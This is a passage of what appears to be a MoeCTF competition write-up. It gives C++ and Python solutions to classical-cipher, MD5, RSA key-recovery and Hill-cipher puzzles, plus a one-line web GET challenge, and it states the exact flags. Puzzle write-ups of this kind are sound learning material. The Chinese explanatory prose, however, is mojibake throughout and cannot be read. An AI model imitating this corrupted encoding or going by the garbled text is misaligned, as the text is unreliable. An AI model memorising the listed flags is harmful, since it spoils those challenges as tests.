</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">A</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span> <span class="o">+</span> <span class="n">r</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">qr</span> <span class="o">&lt;=</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ql</span> <span class="o">&gt;</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">node</span> <span class="n">left</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">),</span> <span class="n">right</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">ql</span><span class="p">,</span> <span class="n">qr</span><span class="p">),</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxv</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">maxl</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxv</span><span class="p">,</span> <span class="n">right</span><span class="p">.</span><span class="n">maxv</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxl</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">left</span><span class="p">.</span><span class="n">maxl</span><span class="p">,</span> <span class="n">left</span><span class="p">.</span><span class="n">sum</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">maxl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span><span class="p">.</span><span class="n">maxr</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">right</span><span class="p">.</span><span class="n">maxr</span><span class="p">,</span> <span class="n">left</span><span class="p">.</span><span class="n">maxr</span> <span class="o">+</span> <span class="n">right</span><span class="p">.</span><span class="n">sum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">N</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">M</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%lld&#34;</span><span class="p">,</span> <span class="n">tmp</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ii</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LL</span> <span class="n">ll</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">M</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ii</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ii</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">jj</span> <span class="o">&gt;</span> <span class="n">kk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">swap</span><span class="p">(</span><span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%lld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">query</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">kk</span><span class="p">).</span><span class="n">maxv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%lld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ll</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">update</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">jj</span><span class="p">,</span> <span class="n">ll</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="crypto">Crypto</h2>
<h3 id="pigpen-cipher">Pigpen Cipher</h3>
<p>è¿™ä¸ªæ˜¯çŒªåœˆå¯†ç , ä»å¿…åº”ä¸Šå¯ä»¥æœåˆ°çŒªåœˆå¯†ç çš„å¯†ç è¡¨, å¯¹ç€ç ´è§£å°±å¯ä»¥äº†.</p>
<h3 id="rail-fence-cipher">Rail fence cipher</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}ofEi3_hl_d_sar0pe{_Lncesk_cslyghctr_c12_i0li_pry
</span></span></code></pre></div><p>æ …æ å¯†ç , å¿…åº”äº†è§£äº†ä¸€ä¸‹, å‘ç°åˆ†ç»„, ç„¶åå°±æ‰¾äº†ä¸€ä¸‹o, é€šè¿‡oçš„åˆ¤æ–­å‘ç°åˆ†ç»„çš„å¥¥å¦™:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mthAf2p_anf@ccta}
</span></span><span class="line"><span class="cl">ofEi3_hl_d_sar0p
</span></span><span class="line"><span class="cl">e{_Lncesk_cslygh
</span></span><span class="line"><span class="cl">ctr_c12_i0li_pry
</span></span></code></pre></div><p>ç„¶åç«–ç€è¯»å°±å¯ä»¥æ‰¾åˆ°<code>flag</code>å•¦. <code>flag</code>: <code>moectf{thE_rAiL_f3nc2_c1phe2_ls_a_kind_0f_cl@ssical_crypt0graphy}</code></p>
<h3 id="bacons-cipher">Baconâ€™s Cipher</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">AqCEclcIZQjbecyOhgXSwOdveKjpYyaeknUkyokazpyUnhFDSmvQEvCdmoFsfAvfyvTQFWkyBNIojUddNbtmT
</span></span></code></pre></div><p>è¿™é“é¢˜å±…ç„¶æ˜¯ä»¥å¤§å°å†™æ¥éšè—ä¿¡æ¯çš„!!!</p>
<p>ç„¶åå°±æœ‰äº†ä¸‹é¢è¿™ä¸ªç¨‹åº:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿è¡Œä¸€ä¸‹, å¾—åˆ°äº†ä¸€ä¸²äºŒè¿›åˆ¶: <code>0100111000111110110010111011011111011111111011000110010111011011110000110001101101110</code></p>
<p>æ‰‹åŠ¨åˆ†å‰²ä¸€ä¸‹:</p>
<p><code>01001 11000 11111 01100 10111 01101 11110 11111 11101 10001 10010 11101 10111 10000 11000 11011 01110</code></p>
<p>å‘ç°è§£å¯†çš„ä¸å¯¹! <code>11111</code>å¤ªå¤¸å¼ äº†&hellip;ç„¶åæ”¹ä¸€ä¸‹ä»£ç ,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cctype&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">isupper</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å†è¿è¡Œ, å¾—åˆ°äº†å¦ä¸€ä¸²äºŒè¿›åˆ¶ ( å…¶å®å°±æ˜¯ä¸Šé¢çš„ç»“æœçš„æŒ‰ä½éè¿ç®— )</p>
<p><code>10110 00111 00000 10011 01000 10010 00001 00000 00010 01110 01101 00010 01000 01111 00111 00100 10001</code>, å¯¹ç€å­—æ¯åºå·è¡¨è§£å‡º<code>flag</code>.</p>
<h3 id="frequency-analysis">Frequency analysis?</h3>
<p>ä¸€çœ‹é¢˜ç›®, é¢‘ç‡åˆ†æå•Š&hellip; æˆ‘ä¸èƒ½å½“å·¥å…·äºº! äºæ˜¯å†™ä¸€ç¨‹åº:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;map&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;algorithm&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;.</span><span class="se">\\</span><span class="s">chars.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">freopen</span><span class="p">(</span><span class="s">&#34;.</span><span class="se">\\</span><span class="s">frequentre.txt&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">map</span><span class="o">&lt;</span><span class="kt">char</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">sign</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">types</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">input</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">types</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">==</span><span class="n">string</span><span class="o">::</span><span class="n">npos</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">types</span> <span class="o">+=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">sign</span><span class="p">[</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">sort</span><span class="p">(</span><span class="n">types</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">types</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">total</span> <span class="o">=</span> <span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">frequent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">types</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">frequent</span> <span class="o">=</span> <span class="kt">double</span><span class="p">(</span><span class="n">sign</span><span class="p">[</span><span class="n">types</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span> <span class="o">/</span> <span class="n">total</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">types</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;: &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">frequent</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;%</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>ç„¶åæ‰“å¼€ç»“æœçš„æ–‡ä»¶, å†å¤åˆ¶æ‹–åˆ°<code>Excel</code>é‡Œé¢, ç„¶åæ ¹æ®é¢‘ç‡å¤§å°æ’åº, ç„¶åä»ä¸Šå¾€ä¸‹è¯»å°±å¾—åˆ°<code>flag</code>äº†&hellip;</p>
<h3 id="md5">MD5</h3>
<p>å¿…åº”, æ‰¾ä¸€ç½‘ç«™, å¤åˆ¶ç²˜è´´, æŸ¥è¯¢ä¹‹, å¾—<code>flag</code>.</p>
<h3 id="columnar-transposition">Columnar Transposition</h3>
<blockquote>
<p>ç»´åŸºç™¾ç§‘å¯¹åˆ—ç§»ä½å¯†ç çš„è§£é‡Šå¦‚ä¸‹:</p>
<h3 id="columnar-transposition-1">Columnar transposition</h3>
<p>In a columnar transposition, the message is written out in rows of a fixed length, and then read out again column by column, and the columns are chosen in some scrambled order. Both the width of the rows and the permutation of the columns are usually defined by a keyword. For example, the keyword <code>ZEBRAS</code> is of length 6 (so the rows are of length 6), and the permutation is defined by the alphabetical order of the letters in the keyword. In this case, the order would be &ldquo;6 3 2 4 1 5&rdquo;.</p>
<p>In a regular columnar transposition cipher, any spare spaces are filled with nulls; in an irregular columnar transposition cipher, the spaces are left blank. Finally, the message is read off in columns, in the order specified by the keyword. For example, suppose we use the keyword <code>ZEBRAS</code> and the message <code>WE ARE DISCOVERED. FLEE AT ONCE</code>. In a regular columnar transposition, we write this into the grid as follows:</p>
<pre tabindex="0"><code>6 3 2 4 1 5
W E A R E D
I S C O V E
R E D F L E
E A T O N C
E Q K J E U
</code></pre><p>providing five nulls (<code>QKJEU</code>), these letters can be randomly selected as they just fill out the incomplete columns and are not part of the message. The ciphertext is then read off as:</p>
<pre tabindex="0"><code>EVLNE ACDTK ESEAQ ROFOJ DEECU WIREE
</code></pre><p>In the irregular case, the columns are not completed by nulls:</p>
<pre tabindex="0"><code>6 3 2 4 1 5
W E A R E D
I S C O V E
R E D F L E
E A T O N C
E
</code></pre><p>This results in the following ciphertext:</p>
<pre tabindex="0"><code>EVLNA CDTES EAROF ODEEC WIREE
</code></pre><p>To decipher it, the recipient has to work out the column lengths by dividing the message length by the key length. Then he can write the message out in columns again, then re-order the columns by reforming the key word.</p>
<p>In a variation, the message is blocked into segments that are the key length long and to each segment the same permutation (given by the key) is applied. This is equivalent to a columnar transposition where the read-out is by rows instead of columns.</p>
<p>Columnar transposition continued to be used for serious purposes as a component of more complex ciphers at least into the 1950s.</p>
</blockquote>
<p>ä¸è¿‡è¿™é¢˜æœ‰å¾ˆå¤§çš„å‘&hellip; å°±æ˜¯è§£å¯†é¡ºåºå’ŒåŠ å¯†æ˜¯åç€æ¥çš„.. æˆ‘ä¹‹å‰æäº†å¥½ä¹…éƒ½æä¸å‡ºæ¥&hellip; æŒ‰ç…§Wikiåˆ†ç»„é‡æ’, æˆåŠŸæ‹¿åˆ°<code>flag</code>.</p>
<h3 id="easy-rsa">Easy RSA</h3>
<p>è¿™é“é¢˜æˆ‘ç ”ç©¶äº†å¥½ä¹…&hellip; æœ€ååœ¨çº¿åˆ†è§£å¤§æ•°æ‰¾åˆ°på’Œq, ç„¶åbingæœæ¥çš„è„šæœ¬ä¿®æ”¹ä¸€ä¸‹è·‘ä¸€éå°±è¿‡äº†&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">=</span><span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">=</span><span class="mi">296173636181072725338746212384476813557</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">q</span><span class="o">=</span><span class="mi">336771668019607304680919844592337860739</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">e</span><span class="o">=</span><span class="mi">65537</span>
</span></span><span class="line"><span class="cl"><span class="n">arsa</span><span class="o">.</span><span class="n">n</span><span class="o">=</span><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">*</span><span class="n">arsa</span><span class="o">.</span><span class="n">q</span>
</span></span><span class="line"><span class="cl"><span class="n">Fn</span><span class="o">=</span><span class="n">long</span><span class="p">((</span><span class="n">arsa</span><span class="o">.</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">arsa</span><span class="o">.</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">x</span><span class="o">=</span><span class="p">(</span><span class="n">Fn</span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">x</span><span class="o">%</span><span class="n">arsa</span><span class="o">.</span><span class="n">e</span><span class="o">==</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">           <span class="n">arsa</span><span class="o">.</span><span class="n">d</span><span class="o">=</span><span class="n">x</span><span class="o">/</span><span class="n">arsa</span><span class="o">.</span><span class="n">e</span>
</span></span><span class="line"><span class="cl">           <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;private.pem&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">arsa</span><span class="o">.</span><span class="n">exportKey</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>æ‹¿åˆ°ç§é’¥ä¹‹å, éšä¾¿ç”¨ä¸ªä»€ä¹ˆæ–¹æ³•, opensslä¹Ÿå¥½, åœ¨çº¿è§£å¯†ä¹Ÿå¥½, åæ­£å°±å‡ºæ¥äº†.</p>
<h3 id="hill-cipher">Hill Cipher</h3>
<p>è¿™é¢˜æˆ‘çœŸçš„æ˜¯å†™åˆ°åœ°è€å¤©è’&hellip;</p>
<p>æ‹¿åˆ°é¢˜ä¹‹åå…ˆæ‰¾äº†æ— æ•°ä¸ªç½‘ç«™å‘ç°è§£ä¸äº†, å°±è‡ªå·±ç ”ç©¶äº†ä¸€ä¸‹, å‘ç°çŸ©é˜µæ±‚é€†ç„¶åå’Œå¯†æ–‡æ±‚ç‚¹ç§¯, äºæ˜¯æˆ‘å°±æ‰“å¼€å¾®è½¯çš„<code>Mathematics</code>ç®—äº†ä¸€å¹´å¾—åˆ°äº†è¾“å‡º, ç„¶åå†™ä¸€ç¨‹åºæ‰‹åŠ¨è¾“å…¥å¼„å‡º<code>flag</code>&hellip;</p>
<p>å…·ä½“æƒ…å†µå‘¢, å°±æ˜¯é¢˜ç›®ç»™äº†ä¸ªçŸ©é˜µå¯†é’¥, å…ˆæ±‚é€†, ç„¶åå­˜ä¸‹æ¥å’Œåˆ†å¥½ç»„çš„å¯†æ–‡æŒ¨ä¸ªæ±‚ç‚¹ç§¯, æœ€åè¾“å‡ºç»“æœæ—¶, æŠŠå°æ•°éƒ¨åˆ†ç›´æ¥èˆæ‰å°±è¡Œäº†, ç„¶åè¾“å…¥ä¸‹é¢çš„ç¨‹åºé‡Œå¼€å§‹æŸ¥è¡¨.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">table</span> <span class="o">=</span> <span class="s">&#34;abijklQRSTUVWXmnop@#$%wxyzABCDcdefghEFGHI&amp;*()_+JKLMNOPYZ01234qrstuv56789!^-=&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">double</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">%=</span> <span class="n">table</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">x</span> <span class="o">+=</span> <span class="n">table</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">table</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ç®—å‡ºæ¥çš„æ˜æ–‡é•¿è¿™æ ·, æ³¨æ„è¦ç«–ç€è¾“è¿›å»
</span></span></span><span class="line"><span class="cl"><span class="c1">// 49 0  5  7  8  56 57 28
</span></span></span><span class="line"><span class="cl"><span class="c1">// 57 62 34 0  45 52 33 65
</span></span></span><span class="line"><span class="cl"><span class="c1">// 15 45 58 45 63 45 33 49
</span></span></span><span class="line"><span class="cl"><span class="c1">// 58 26 1  57 16 29 2  64
</span></span></span></code></pre></div><p><code>flag</code>: <code>moectf{L1n2ar_Alg2bRa_1S_so0O_D1ffiCuLt}</code></p>
<h2 id="web">Web</h2>
<h3 id="get">GET</h3>
<p>æµè§ˆå™¨æ‰“å¼€<code>http://39.108.11.206:10002/?a</code>æ‹¿åˆ°<code>flag</code>.</p>
<h3 id="post">POST</h3>
